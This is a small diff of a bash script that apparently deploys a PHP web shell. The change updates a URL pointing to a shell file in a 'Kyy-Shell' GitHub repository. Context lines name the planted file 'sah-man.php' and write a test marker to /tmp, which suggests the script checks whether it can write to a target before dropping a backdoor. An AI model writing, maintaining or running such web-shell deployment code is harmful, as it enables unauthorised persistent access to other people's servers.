@@ -1,7 +1,7 @@
 #!/bin/bash
 
 TESTFILE="test123zz.txt"
-SHELL_URL="https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/rcsahman2.txt"
+SHELL_URL="https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/shell-sah-man.txt"
 SHELL_NAME="sah-man.php"
 echo "TESTPAGE_$(date +%s)" > "/tmp/$TESTFILE"
 
